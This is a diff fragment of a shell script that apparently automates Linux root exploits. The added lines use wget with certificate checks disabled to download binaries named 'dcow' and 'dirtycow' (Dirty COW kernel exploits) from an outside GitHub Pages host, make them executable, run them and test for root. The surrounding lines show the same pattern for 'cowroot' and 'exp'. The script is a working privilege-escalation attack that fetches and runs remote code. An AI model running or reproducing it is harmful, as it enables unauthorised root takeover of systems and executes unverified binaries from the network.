@@ -249,6 +249,18 @@ chmod 777 "cowroot"
 check_root
 rm "cowroot"
 
+wget -q "https://0-gram.github.io/id-0/dcow" --no-check-certificate
+chmod 777 "dcow"
+./dcow
+check_root
+rm "dcow"
+
+wget -q "https://0-gram.github.io/id-0/dirtycow" --no-check-certificate
+chmod 777 "dirtycow"
+./dirtycow
+check_root
+rm "dirtycow"
+
 wget -q "https://0-gram.github.io/id-0/exp" --no-check-certificate
 chmod 777 "exp"
 ./exp
